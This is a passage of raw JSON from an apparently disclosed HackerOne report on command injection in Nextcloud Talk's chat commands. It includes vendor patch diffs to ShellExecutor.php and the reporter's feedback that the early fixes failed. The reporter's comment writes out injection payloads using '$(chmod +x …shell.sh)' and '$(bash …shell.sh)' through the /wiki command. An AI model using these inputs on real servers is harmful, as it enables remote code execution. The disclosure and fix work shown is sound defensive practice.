BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=b6281c0e783221166210d92c14a3bb28df0e1d42c64838513375089254676f46","file_size":148294,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-02T14:52:51.681Z","allow_singular_disclosure_after":-15523719.703052174,"singular_disclosure_allowed":true,"vote_count":310,"voters":["fabianfreyer","r4d1kal","trojan187","secator","a_d_a_m","mik317","brahim_boufakri01","nikitastupin","dhakal_ananda","mygf","and 300 more..."],"severity":{"rating":"high","score":8.0,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":14804,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/spreed","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7689651,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2020-04-16T20:44:33.583Z","updated_at":"2020-04-16T20:44:33.583Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7689703,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Reposting commands with correct markdown formatting.\nOnce shell.sh is uploaded via alice, run the following commands in a Talk Conversation:\n```\n/wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh) \n/wiki test $(bash /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh) \n```","markdown_message":"\u003cp\u003eReposting commands with correct markdown formatting.\u003cbr\u003e\nOnce shell.sh is uploaded via alice, run the following commands in a Talk Conversation:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh) \n/wiki test $(bash /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh) \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-04-16T20:50:24.027Z","updated_at":"2020-04-16T20:50:24.027Z","actor":{"username":"covert-spectre","cleared":false,"url":"/covert-spectre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7692308,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you confirm that the following patch is enough:\n\n```diff\ndiff --git a/lib/Chat/Command/ShellExecutor.php b/lib/Chat/Command/ShellExecutor.php\nindex 6c99aa89..e21210db 100644\n--- a/lib/Chat/Command/ShellExecutor.php\n+++ b/lib/Chat/Command/ShellExecutor.php\n@@ -48,7 +48,7 @@ class ShellExecutor {\n                        escapeshellarg($room),\n                        escapeshellarg($user),\n                        $this-\u003eescapeArguments($arguments),\n-                       str_replace('\"', '\\\\\"', $arguments),\n+                       str_replace(['$', '\"'], ['\\\\$', '\\\\\"'], $arguments),\n                ], $cmd);\n \n                return $this-\u003ewrapExec($cmd);\n```","markdown_message":"\u003cp\u003eCan you confirm that the following patch is enough:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/lib/Chat/Command/ShellExecutor.php b/lib/Chat/Command/ShellExecutor.php\nindex 6c99aa89..e21210db 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/Chat/Command/ShellExecutor.php\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/Chat/Command/ShellExecutor.php\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -48,7 +48,7 @@\u003c/span\u003e class ShellExecutor {\n                        escapeshellarg($room),\n                        escapeshellarg($user),\n                        $this-\u0026gt;escapeArguments($arguments),\n\u003cspan class=\"gd\"\u003e-                       str_replace(\u0026#39;\u0026quot;\u0026#39;, \u0026#39;\\\\\u0026quot;\u0026#39;, $arguments),\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+                       str_replace([\u0026#39;$\u0026#39;, \u0026#39;\u0026quot;\u0026#39;], [\u0026#39;\\\\$\u0026#39;, \u0026#39;\\\\\u0026quot;\u0026#39;], $arguments),\n\u003c/span\u003e                ], $cmd);\n\n                return $this-\u0026gt;wrapExec($cmd);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-04-17T06:46:06.708Z","updated_at":"2020-04-17T06:46:06.708Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7693021,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-17T08:21:02.443Z","updated_at":"2020-04-17T08:21:02.443Z","additional_data":{"old_severity":"Critical (9.9)","new_severity":"Critical (9.0)","old_severity_id":694612,"new_severity_id":694929},"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7693027,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-17T08:21:29.019Z","updated_at":"2020-04-17T08:21:29.019Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7696582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Seemed to not be enough, so we decided to go for a more generic approach for the moment.\nCan you give the following patch a try?\n\n```diff\ndiff --git a/lib/Chat/Command/ShellExecutor.php b/lib/Chat/Command/ShellExecutor.php\nindex 6c99aa89..40515c70 100644\n--- a/lib/Chat/Command/ShellExecutor.php\n+++ b/lib/Chat/Command/ShellExecutor.php\n@@ -28,6 +28,8 @@ class ShellExecutor {\n \tpublic const PLACEHOLDER_ROOM = '{ROOM}';\n \tpublic const PLACEHOLDER_USER = '{USER}';\n \tpublic const PLACEHOLDER_ARGUMENTS = '{ARGUMENTS}';\n+\n+\t// Legacy placeholder just returning the --help nowadays\n \tpublic const PLACEHOLDER_ARGUMENTS_DOUBLEQUOTE_ESCAPED = '{ARGUMENTS_DOUBLEQUOTE_ESCAPED}';\n \n \t/**\n@@ -39,59 +41,23 @@ class ShellExecutor {\n \t * @throws \\InvalidArgumentException\n \t */\n \tpublic function execShell(string $cmd, string $arguments, string $room = '', string $user = ''): string {\n+\t\tif (strpos($cmd, self::PLACEHOLDER_ARGUMENTS_DOUBLEQUOTE_ESCAPED) !== false) {\n+\t\t\tthrow new \\InvalidArgumentException('Talk commands using the {ARGUMENTS_DOUBLEQUOTE_ESCAPED} are not supported anymore.');\n+\t\t}\n+\n \t\t$cmd = str_replace([\n \t\t\tself::PLACEHOLDER_ROOM,\n \t\t\tself::PLACEHOLDER_USER,\n \t\t\tself::PLACEHOLDER_ARGUMENTS,\n-\t\t\tself::PLACEHOLDER_ARGUMENTS_DOUBLEQUOTE_ESCAPED,\n \t\t], [\n \t\t\tescapeshellarg($room),\n \t\t\tescapeshellarg($user),\n-\t\t\t$this-\u003eescapeArguments($arguments),\n-\t\t\tstr_replace('\"', '\\\\\"', $arguments),\n+\t\t\tescapeshellarg($arguments),\n \t\t], $cmd);\n \n \t\treturn $this-\u003ewrapExec($cmd);\n \t}\n \n-\tprotected function escapeArguments(string $argumentString): string {\n-\t\t$arguments = explode(' ', $argumentString);\n-\n-\t\t$result = [];\n-\t\t$buffer = [];\n-\t\t$quote = '';\n-\t\tforeach ($arguments as $argument) {\n-\t\t\tif ($quote === '') {\n-\t\t\t\tif (ltrim($argument, '\"\\'') === $argument) {\n-\t\t\t\t\t$result[] = escapeshellarg($argument);\n-\t\t\t\t} else {\n-\t\t\t\t\t$quote = $argument[0];\n-\t\t\t\t\t$temp = substr($argument, 1);\n-\t\t\t\t\tif (rtrim($temp, $quote) === $temp) {\n-\t\t\t\t\t\t$buffer[] = $temp;\n-\t\t\t\t\t} else {\n-\t\t\t\t\t\t$result[] = $quote . str_replace($quote, '\\\\'. $quote, substr($temp, 0, -1)) . $quote;\n-\t\t\t\t\t\t$quote = '';\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t} else if (rtrim($argument, $quote) === $argument) {\n-\t\t\t\t$buffer[] = $argument;\n-\t\t\t} else {\n-\t\t\t\t$buffer[] = substr($argument, 0, -1);\n-\n-\t\t\t\t$result[] = $quote . str_replace($quote, '\\\\'. $quote, implode(' ', $buffer)) . $quote;\n-\t\t\t\t$quote = '';\n-\t\t\t\t$buffer = [];\n-\t\t\t}\n-\t\t}\n-\n-\t\tif ($quote !== '') {\n-\t\t\t$result[] = escapeshellarg($quote . implode(' ', $buffer));\n-\t\t}\n-\n-\t\treturn implode(' ', $result);\n-\t}\n-\n \t/**\n \t * @param string $cmd\n \t * @return string\ndiff --git a/lib/Command/Command/AddSamples.php b/lib/Command/Command/AddSamples.php\nindex dde16db5..6e601ac3 100644\n--- a/lib/Command/Command/AddSamples.php\n+++ b/lib/Command/Command/AddSamples.php\n@@ -67,7 +67,7 @@ protected function execute(InputInterface $input, OutputInterface $output) {\n \t\t\t$output,\n \t\t\t'wiki',\n \t\t\t'Wikipedia',\n-\t\t\t'php ' . $appPath . '/sample-commands/wikipedia.php \"{ARGUMENTS_DOUBLEQUOTE_ESCAPED}\"'\n+\t\t\t'php ' . $appPath . '/sample-commands/wikipedia.php {ARGUMENTS}'\n \t\t);\n \n \t\t$chmod = fileperms($appPath . '/sample-commands/calc.sh');\n@@ -80,7 +80,7 @@ protected function execute(InputInterface $input, OutputInterface $output) {\n \t\t\t\t$output,\n \t\t\t\t'calculator',\n \t\t\t\t'Calculator',\n-\t\t\t\t$appPath . '/sample-commands/calc.sh \"{ARGUMENTS_DOUBLEQUOTE_ESCAPED}\"',\n+\t\t\t\t$appPath . '/sample-commands/calc.sh {ARGUMENTS}',\n \t\t\t\tCommand::RESPONSE_USER\n \t\t\t);\n \n@@ -97,7 +97,7 @@ protected function execute(InputInterface $input, OutputInterface $output) {\n \t\t\t$output,\n \t\t\t'hackernews',\n \t\t\t'Hacker News',\n-\t\t\t'php ' . $appPath . '/sample-commands/hackernews.php \"{ARGUMENTS_DOUBLEQUOTE_ESCAPED}\"'\n+\t\t\t'php ' . $appPath . '/sample-commands/hackernews.php {ARGUMENTS}'\n \t\t);\n \n \t\tif (empty($this-\u003ecommands)) {\n```","markdown_message":"\u003cp\u003eSeemed to not be enough, so we decided to go for a more generic approach for the moment.\u003cbr\u003e\nCan you give the following patch a try?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/lib/Chat/Command/ShellExecutor.php b/lib/Chat/Command/ShellExecutor.php\nindex 6c99aa89..40515c70 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/Chat/Command/ShellExecutor.php\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/Chat/Command/ShellExecutor.php\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -28,6 +28,8 @@\u003c/span\u003e class ShellExecutor {\n    public const PLACEHOLDER_ROOM = \u0026#39;{ROOM}\u0026#39;;\n    public const PLACEHOLDER_USER = \u0026#39;{USER}\u0026#39;;\n    public const PLACEHOLDER_ARGUMENTS = \u0026#39;{ARGUMENTS}\u0026#39;;\n\u003cspan class=\"gi\"\u003e+\n+   // Legacy placeholder just returning the --help nowadays\n\u003c/span\u003e    public const PLACEHOLDER_ARGUMENTS_DOUBLEQUOTE_ESCAPED = \u0026#39;{ARGUMENTS_DOUBLEQUOTE_ESCAPED}\u0026#39;;\n\n    /**\n\u003cspan class=\"p\"\u003e@@ -39,59 +41,23 @@\u003c/span\u003e class ShellExecutor {\n     * @throws \\InvalidArgumentException\n     */\n    public function execShell(string $cmd, string $arguments, string $room = \u0026#39;\u0026#39;, string $user = \u0026#39;\u0026#39;): string {\n\u003cspan class=\"gi\"\u003e+       if (strpos($cmd, self::PLACEHOLDER_ARGUMENTS_DOUBLEQUOTE_ESCAPED) !== false) {\n+           throw new \\InvalidArgumentException(\u0026#39;Talk commands using the {ARGUMENTS_DOUBLEQUOTE_ESCAPED} are not supported anymore.\u0026#39;);\n+       }\n+\n\u003c/span\u003e        $cmd = str_replace([\n            self::PLACEHOLDER_ROOM,\n            self::PLACEHOLDER_USER,\n            self::PLACEHOLDER_ARGUMENTS,\n\u003cspan class=\"gd\"\u003e-           self::PLACEHOLDER_ARGUMENTS_DOUBLEQUOTE_ESCAPED,\n\u003c/span\u003e        ], [\n            escapeshellarg($room),\n            escapeshellarg($user),\n\u003cspan class=\"gd\"\u003e-           $this-\u0026gt;escapeArguments($arguments),\n-           str_replace(\u0026#39;\u0026quot;\u0026#39;, \u0026#39;\\\\\u0026quot;\u0026#39;, $arguments),\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+           escapeshellarg($arguments),\n\u003c/span\u003e        ], $cmd);\n\n        return $this-\u0026gt;wrapExec($cmd);\n    }\n\n-   protected function escapeArguments(string $argumentString): string {\n\u003cspan class=\"gd\"\u003e-       $arguments = explode(\u0026#39; \u0026#39;, $argumentString);\n-\n-       $result = [];\n-       $buffer = [];\n-       $quote = \u0026#39;\u0026#39;;\n-       foreach ($arguments as $argument) {\n-           if ($quote === \u0026#39;\u0026#39;) {\n-               if (ltrim($argument, \u0026#39;\u0026quot;\\\u0026#39;\u0026#39;) === $argument) {\n-                   $result[] = escapeshellarg($argument);\n-               } else {\n-                   $quote = $argument[0];\n-                   $temp = substr($argument, 1);\n-                   if (rtrim($temp, $quote) === $temp) {\n-                       $buffer[] = $temp;\n-                   } else {\n-                       $result[] = $quote . str_replace($quote, \u0026#39;\\\\\u0026#39;. $quote, substr($temp, 0, -1)) . $quote;\n-                       $quote = \u0026#39;\u0026#39;;\n-                   }\n-               }\n-           } else if (rtrim($argument, $quote) === $argument) {\n-               $buffer[] = $argument;\n-           } else {\n-               $buffer[] = substr($argument, 0, -1);\n-\n-               $result[] = $quote . str_replace($quote, \u0026#39;\\\\\u0026#39;. $quote, implode(\u0026#39; \u0026#39;, $buffer)) . $quote;\n-               $quote = \u0026#39;\u0026#39;;\n-               $buffer = [];\n-           }\n-       }\n-\n-       if ($quote !== \u0026#39;\u0026#39;) {\n-           $result[] = escapeshellarg($quote . implode(\u0026#39; \u0026#39;, $buffer));\n-       }\n-\n-       return implode(\u0026#39; \u0026#39;, $result);\n-   }\n-\n\u003c/span\u003e    /**\n     * @param string $cmd\n     * @return string\n\u003cspan class=\"gh\"\u003ediff --git a/lib/Command/Command/AddSamples.php b/lib/Command/Command/AddSamples.php\nindex dde16db5..6e601ac3 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/Command/Command/AddSamples.php\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/Command/Command/AddSamples.php\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -67,7 +67,7 @@\u003c/span\u003e protected function execute(InputInterface $input, OutputInterface $output) {\n            $output,\n            \u0026#39;wiki\u0026#39;,\n            \u0026#39;Wikipedia\u0026#39;,\n\u003cspan class=\"gd\"\u003e-           \u0026#39;php \u0026#39; . $appPath . \u0026#39;/sample-commands/wikipedia.php \u0026quot;{ARGUMENTS_DOUBLEQUOTE_ESCAPED}\u0026quot;\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+           \u0026#39;php \u0026#39; . $appPath . \u0026#39;/sample-commands/wikipedia.php {ARGUMENTS}\u0026#39;\n\u003c/span\u003e        );\n\n        $chmod = fileperms($appPath . \u0026#39;/sample-commands/calc.sh\u0026#39;);\n\u003cspan class=\"p\"\u003e@@ -80,7 +80,7 @@\u003c/span\u003e protected function execute(InputInterface $input, OutputInterface $output) {\n                $output,\n                \u0026#39;calculator\u0026#39;,\n                \u0026#39;Calculator\u0026#39;,\n\u003cspan class=\"gd\"\u003e-               $appPath . \u0026#39;/sample-commands/calc.sh \u0026quot;{ARGUMENTS_DOUBLEQUOTE_ESCAPED}\u0026quot;\u0026#39;,\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+               $appPath . \u0026#39;/sample-commands/calc.sh {ARGUMENTS}\u0026#39;,\n\u003c/span\u003e                Command::RESPONSE_USER\n            );\n\n@@ -97,7 +97,7 @@ protected function execute(InputInterface $input, OutputInterface $output) {\n            $output,\n            \u0026#39;hackernews\u0026#39;,\n            \u0026#39;Hacker News\u0026#39;,\n\u003cspan class=\"gd\"\u003e-           \u0026#39;php \u0026#39; . $appPath . \u0026#39;/sample-commands/hackernews.php \u0026quot;{ARGUMENTS_DOUBLEQUOTE_ESCAPED}\u0026quot;\u0026#39;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+           \u0026#39;php \u0026#39; . $appPath . \u0026#39;/sample-commands/hackernews.php {ARGUMENTS}\u0026#39;\n\u003c/span\u003e        );\n\n        if (empty($this-\u0026gt;commands)) {\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-04-17T13:30:53.065Z","updated_at":"2020-04-17T13:30:53.065Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7699829,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I deployed the code changes as described but it does not look like the changes fixed the issue - I am still able to execute $(subcommands) - please see attached screenshots. \n\nI am not a PHP developer, however, the documentation for `escapeshellarg` suggests that it will not fix this issue as it is only concerned with adding quotes for escaping. I believe it is nessesary to run the resulting `cmd` string through `escapeshellcmd` which precedes `$` with a backslash, though please note the document states `are escaped only if they are not paired` and it is not clear what \"not paired\" means. \n\n[escapeshellarg](https://www.php.net/manual/en/function.escapeshellarg.php)\n\u003e escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() and the backtick operator. On Windows, escapeshellarg() instead replaces percent signs, exclamation marks (delayed variable substitution) and double quotes with spaces and adds double quotes around the string. \n\n[escapeshellcmd](https://www.php.net/manual/en/function.escapeshellcmd.php)\n\u003e escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands. This function should be used to make sure that any data coming from user input is escaped before this data is passed to the exec() or system() functions, or to the backtick operator.  Following characters are preceded by a backslash: \u0026#;`|*?~\u003c\u003e^()[]{}$\\, \\x0A and \\xFF. ' and \" are escaped only if they are not paired. In Windows, all these characters plus % and ! are replaced by a space instead. \n\nPossible Fix\nPossible fix, by adding `escapeshellcmd`. I've attempted to deploy this myself, however the change causes the /wiki command to hang indefinitely. This may be the fix but requires additional engineering and testing to ensure the commands work correctly. \n```\npublic function execShell(string $cmd, string $arguments, string $room = '', string $user = ''): string {\n\n\tif (strpos($cmd, self::PLACEHOLDER_ARGUMENTS_DOUBLEQUOTE_ESCAPED) !== false) {\n\t\tthrow new \\InvalidArgumentException('Talk commands using the {ARGUMENTS_DOUBLEQUOTE_ESCAPED} are not supported anymore.');\n\t}\n\n\t$cmd = str_replace([\n\t\tself::PLACEHOLDER_ROOM,\n\t\tself::PLACEHOLDER_USER,\n\t\tself::PLACEHOLDER_ARGUMENTS,\n\t], [\n\t\tescapeshellarg($room),\n\t\tescapeshellarg($user),\n\t\tescapeshellarg($arguments),\n\t], $cmd);\n\t\t\n\t$cmd = escapeshellcmd($cmd); //\u003c-------possible fix-------\n\treturn $this-\u003ewrapExec($cmd);\n}\n```","markdown_message":"\u003cp\u003eI deployed the code changes as described but it does not look like the changes fixed the issue - I am still able to execute $(subcommands) - please see attached screenshots. \u003c/p\u003e\n\n\u003cp\u003eI am not a PHP developer, however, the documentation for \u003ccode\u003eescapeshellarg\u003c/code\u003e suggests that it will not fix this issue as it is only concerned with adding quotes for escaping. I believe it is nessesary to run the resulting \u003ccode\u003ecmd\u003c/code\u003e string through \u003ccode\u003eescapeshellcmd\u003c/code\u003e which precedes \u003ccode\u003e$\u003c/code\u003e with a backslash, though please note the document states \u003ccode\u003eare escaped only if they are not paired\u003c/code\u003e and it is not clear what \u0026quot;not paired\u0026quot; means. \u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fwww.php.net%2Fmanual%2Fen%2Ffunction.escapeshellarg.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eescapeshellarg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eescapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() and the backtick operator. On Windows, escapeshellarg() instead replaces percent signs, exclamation marks (delayed variable substitution) and double quotes with spaces and adds double quotes around the string. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fwww.php.net%2Fmanual%2Fen%2Ffunction.escapeshellcmd.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eescapeshellcmd\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eescapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands. This function should be used to make sure that any data coming from user input is escaped before this data is passed to the exec() or system() functions, or to the backtick operator.  Following characters are preceded by a backslash: `|*?~\u0026lt;\u0026gt;^()[]{}$\\, \\x0A and \\xFF. \u0026#39; and \u0026quot; are escaped only if they are not paired. In Windows, all these characters plus % and ! are replaced by a space instead. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003ePossible Fix\u003cbr\u003e\nPossible fix, by adding \u003ccode\u003eescapeshellcmd\u003c/code\u003e. I\u0026#39;ve attempted to deploy this myself, however the change causes the /wiki command to hang indefinitely. This may be the fix but requires additional engineering and testing to ensure the commands work correctly. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003epublic function execShell(string $cmd, string $arguments, string $room = \u0026#39;\u0026#39;, string $user = \u0026#39;\u0026#39;): string {\n\n    if (strpos($cmd, self::PLACEHOLDER_ARGUMENTS_DOUBLEQUOTE_ESCAPED) !== false) {\n        throw new \\InvalidArgumentException(\u0026#39;Talk commands using the {ARGUMENTS_DOUBLEQUOTE_ESCAPED} are not supported anymore.\u0026#39;);\n    }\n\n    $cmd = str_replace([\n        self::PLACEHOLDER_ROOM,\n        self::PLACEHOLDER_USER,\n        self::PLACEHOLDER_ARGUMENTS,\n    ], [\n        escapeshellarg($room),\n        escapeshellarg($user),\n        escapeshellarg($arguments),\n    ], $cmd);\n\n    $cmd = escapeshellcmd($cmd); //\u0026lt;-------possible fix-------\n    return $this-\u0026gt;wrapExec($cmd);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-04-17T18:50:41.624Z","updated_at":"2020-04-17T18:55:02.691Z","actor":{"username":"covert-spectre","cleared":false,"url":"/covert-spectre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":793061,"filename":"2-1-escapeshellcmd-change.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2qm5RM8q3EJhJckS7B2c6vra?response-content-disposition=attachment%3B%20filename%3D%222-1-escapeshellcmd-change.png%22%3B%20filename%2A%3DUTF-8%27%272-1-escapeshellcmd-change.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070131Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=b8c515be3999a914cc671e1664b77e3f68f6042252e44c763bfdbb5c01dba46b"},{"id":793060,"filename":"2-2-escapeshellcmd-hanging.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ko1xKBNjnUrNEQAEUF1cBmRe